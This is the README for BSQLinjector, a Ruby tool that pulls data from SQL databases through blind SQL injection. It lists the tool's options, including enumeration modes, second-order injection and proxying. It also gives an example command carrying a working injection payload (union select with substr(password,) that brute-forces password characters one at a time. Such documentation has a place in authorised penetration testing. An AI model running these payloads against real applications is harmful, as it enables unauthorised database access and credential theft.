## BSQLinjector

BSQLinjector uses blind method to retrieve data from SQL databases.
I recommend using "--test" switch to clearly see how configured payload looks like before sending it to an application.

## Options:
```
  --file	    Mandatory - File containing valid HTTP request and SQL injection point (SQLINJECT). (--file=/tmp/req.txt)
  --pattern	    Mandatory - Pattern to look for when query is true. (--pattern=truestatement)
  --prepend	    Mandatory - Main payload. (--prepend="abcd'and'a'='b'+union+select+'truestatement'+from+table+where+col%3d'value'+and+substr(password,"
  --append	    How to end our payload. For example comment out rest of SQL statement. (--append='#)
  --schar	    Character placed around chars. This character is not used while in hex mode. (--schar="'")
  --2ndfile	    File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)

  --mode	    Blind mode to use - (between - b (generates less requests), moreless - a (generates less requests by using "<", ">", "=" characters), like - l (complete bruteforce), equals - e (complete bruteforce)). (--mode=l)
  --postgres        Use postgres "for" in substring function (e.g. from 1 for 1).
  --hex		    Use hex to compare instead of characters.
  --case	    Case sensitivity.

  --ssl		    Use SSL.
  --proxy	    Proxy to use. (--proxy=127.0.0.1:8080)

  --test	    Enable test mode. Do not send request, just show full payload.
  --special	    Include all special characters in enumeration.
  --start	    Start enumeration from specified character. (--start=10)
  --max		    Maximum characters to enumerate. (--max=10)
  --timeout	    Timeout in waiting for responses. (--timeout=20)
  --only-final	    Stop showing each enumerated letter.
  --comma	    Encode comma.
  --bracket	    Add brackets to the end of substring function. --bracket="))"
  --hexspace	    Use space instead of brackets to split hex values.
  --verbose	    Show verbose messages.
  ```

## Example usage:
```
  ruby ./BSQLinjector.rb --pattern=truestatement --file=/tmp/req.txt --schar="'" --prepend="abcd'and'a'='b'+union+select+'truestatement'+from+table+where+col%3d'value'+and+substr(password," --append="'#" --ssl
```
